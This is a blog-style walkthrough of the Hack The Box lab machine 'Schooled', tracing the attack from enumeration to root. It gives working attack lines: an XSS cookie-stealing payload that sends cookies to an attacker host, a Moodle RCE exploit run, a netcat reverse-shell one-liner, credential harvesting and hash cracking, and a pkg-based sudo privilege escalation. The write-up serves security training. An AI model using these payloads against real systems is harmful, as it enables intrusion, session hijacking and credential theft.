---
layout: post
title: Schooled
published: true
---

**Schooled is a medium machine from Hack The Box.**

### Enumeration

This machine is running FreeBSD according to Hack the Box. I'll launch an `nmap` scan to start enumerating services.

`nmap -sC -sV -vv -p- -oA enum/nmap_allports 10.10.10.234`

```
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGY8PnQ2GFk9RrUQ82xGivlyXZ8k99JFZAFlNqJIftRHSGWL3HsfaO08lnGCrqVxj3235k0L74SJAqWfJs1ykTRipcZpsI5QvwYPyqpisMgH/SdCH1wehZpgaXRwdn52ob9+GxZ6qjqIon0cH0XR1hkNIGdbTt4RRMy+IfynzVuomW2mUi0tnnXU69pcyYNMShND4PqxVDKZHwUyeDIiYVBvnL5P9qEh0Q/t0HKWFHQ8otwWEpL3jnn774RFP9ETtZsJ/xosuhty02yIZuP6vqtbWfVqcqM8v1R3jm/xjXfXxiflGO09KO2aePAbEhNEofb7V/f33dRQDv5mr9ceZ1
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHc4TgrG+CyKqaIsk10XmAhUKULXK6Bq3bHHeJiWuBmdGS1k3Fp60OoVFdDKQj9aihkaUmbJ8fkG6dp07bm8IcM=
|   256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWIP8gV7SGQNoODfYq9qg1k3j6ZZg+1L9zIU9FrHPaf
80/tcp    open  http    syn-ack Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
|_http-favicon: Unknown favicon MD5: 460AF0375ECB7C08C3AE0B6E0B82D717
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
```

SSH and HTTP are open, on 22 and 80, and also what could be a MySQL server. I'll take a look at the webpage first.

While I check out the HTTP side of things, I'll also start a scan of possible subdirectories with `gobuster`:

`gobuster dir -u 10.10.10.234 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,html -o enum/gobuster_raft_small`

Here's the home page. 

![Pasted image 20210729105052](https://user-images.githubusercontent.com/60187707/136669208-180406cf-b58b-46d6-87b3-b7e51e2000e7.png)

Outside of some possible names of teachers we could use to make a list of users, there's not much exciting here. As I keep poking around, I'll run another scan for subdomains with `wfuzz`:

`wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u 'http://schooled.htb' -H "Host: FUZZ.schooled.htb" --hl 461`

After a little bit, I get a hit on a valid subdomain, `moodle.schooled.htb`. I'll add that to my `/etc/hosts` file and go digging.

![Pasted image 20210729130906](https://user-images.githubusercontent.com/60187707/136669344-dfb738ae-2231-4f8f-8b2e-8fb4b6b979a8.png)

---

#### moodle.schooled.htb

![Pasted image 20210729130946](https://user-images.githubusercontent.com/60187707/136669356-7f803dea-af8d-4507-963f-c494daae9e62.png)

Moodle is a learning management system. Basically a course repo. Trying to open the course pages but I think the site wants me to be logged in. So I'll create an account.

![Pasted image 20210729131146](https://user-images.githubusercontent.com/60187707/136669427-7b634b09-02c0-4b74-a2b3-97c8a8f827c1.png)

Tried the email domain `@schooled.htb` but the site wants me to use `@student.schooled.htb`. I guess I will.

![Pasted image 20210729131526](https://user-images.githubusercontent.com/60187707/136669434-c12efab8-a13b-4162-a952-795c6df34564.png)

Looks like I'm a student at moodle. What else can I do?

![Pasted image 20210729131621](https://user-images.githubusercontent.com/60187707/136669497-df266d02-c248-431c-88e7-c6fc71223901.png)

I can enroll in a few different courses. Looking into the Mathematics course, taught by Manuel Phillips,  I see an announcement from the teacher.

![image](https://user-images.githubusercontent.com/60187707/136669723-cbacd368-36fa-4f38-9047-f909d7b5000c.png)

After some research, I learn that a specific field in a user's account preferences is vulnerable to XSS. That field is the "MoodleNet profile" field. I suppose if Manuel is going to be checking students' MoodleNet profiles, I could get him to click on a malicious link. I know the site is tracking cookies, so maybe I could steal his cookie to impersonate him.

I set my MoodleNet profile to this payload, and start a webserver (`sudo python -m SimpleHTTPServer 8080`) to steal the cookie.

`<img src=x onerror=this.src='http://10.10.14.22/?c='+document.cookie>`

![image](https://user-images.githubusercontent.com/60187707/136669817-e244b64e-80df-4a9e-ab64-daf36d5799cd.png)

Just like that, I start getting hits and cookies. 

![Pasted image 20210807102834](https://user-images.githubusercontent.com/60187707/136669835-ce302fe3-8d22-435e-b56b-c64f67b90334.png)

Pop that cookie into cookie editor in my browser, and I've confirmed I can impersonate Manuel.

![Pasted image 20210729163153](https://user-images.githubusercontent.com/60187707/136669865-9087b5e2-8e4b-44ba-95f2-0217ade7c514.png)

In my searching for vulnerabilities, I found an [exploit](https://github.com/lanzt/CVE-2020-14321) for RCE, and all I need is a cookie. The exploit will allow me to elevate my privileges in Moodle from teacher to manager, and then use a malicious plugin to execute arbitrary commands.

Verifying that it works:

`python3 moodle.py http://moodle.schooled.htb/moodle --cookie eglbg3rlpopednjfhnndioq5hk`

![Pasted image 20210729164348](https://user-images.githubusercontent.com/60187707/136669985-ff19db7c-c228-420a-9a9a-a957ae676f91.png)

Now that I know I have RCE, it's time to pop a shell. I'll start a netcat listener(`nc -lvp 4444`), and run a bash payload:

`python3 moodle.py http://moodle.schooled.htb/moodle --cookie 3ksqqlte3il6f178cibs1tg9gk -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.22 4444 >/tmp/f"`

On as `www`:

![Pasted image 20210807102943](https://user-images.githubusercontent.com/60187707/136670054-dde0b2a2-be07-41c7-9f85-911f8c65e3cc.png)

---

### Privilege Escalation

Best place to start enumerating the system is going to be Moodle config files.

`cat /usr/local/www/apache24/moodle/config.php`

```
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);

$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
```

SQL creds! `moodle:PlaybookMaster2020`

Logging into the `mysql` service: `mysql -u moodle -p PlaybookMaster2020`

`use moodle;`

`select * from mdl_user;`

![Pasted image 20210807111637](https://user-images.githubusercontent.com/60187707/136670224-e680ca45-cada-4d35-ae7e-7596eb30652f.png)

Found a hash for user `admin`. In looking into `/etc/passwd` I see that `jamie` is the only user with login enabled.

![Pasted image 20210807111906](https://user-images.githubusercontent.com/60187707/136670256-deb772d0-3c47-4293-a963-d440b9dd4799.png)

Just a guess, but I bet this hash is his password. Let's see if my friend `john` can crack it:

`john jamie.hash --wordlist=/usr/share/wordlists/rockyou.txt`

![Pasted image 20210807111746](https://user-images.githubusercontent.com/60187707/136670275-bd25207c-50a5-4cd1-ae69-ae1aea1f21cd.png)

Indeed, he can. Now I can SSH in as `jamie: `ssh jamie@10.10.10.234`

![Pasted image 20210807111952](https://user-images.githubusercontent.com/60187707/136670295-4e34a835-3291-4b8b-b550-552cac776085.png)

Now that I have a real user, I can start checking permissions.

![Pasted image 20210807112023](https://user-images.githubusercontent.com/60187707/136670331-8067b8cf-4a98-4039-9584-8c79e034fb6c.png)

It appears that I have a couple `pkg` commands that I can run as the root user, without a password. Let's see what [GTOFOBins](https://gtfobins.github.io/gtfobins/pkg/#sudo) has on `pkg`.

The first step is creating a `bash` script to run, then creating a zipped package of that script. Once I get that on the victim machine, I can use `pkg install` to execute it.

![Pasted image 20210807120943](https://user-images.githubusercontent.com/60187707/136670420-73d171c9-ee32-4f6d-b98c-22ec9c56a6c6.png)

I serve that zip file on a Python webserver, and then use `curl http://10.10.14.22/x-1.0.txz -x x-1.0.txz` to download it. With that done, I can run the final command.

`sudo /usr/sbin/pkg install -y --no-repo-update ./x-1.0.txz`

![Pasted image 20210807121122](https://user-images.githubusercontent.com/60187707/136670445-7b8c0920-69ff-41ba-9e22-9f571e1bfd71.png)

My package set the SUID bit on `/bin/bash` but, because it's symlinked to `/usr/local/bin/bash`, that's where the SUID ends up. I use that to drop in a root shell and Schooled has been owned.

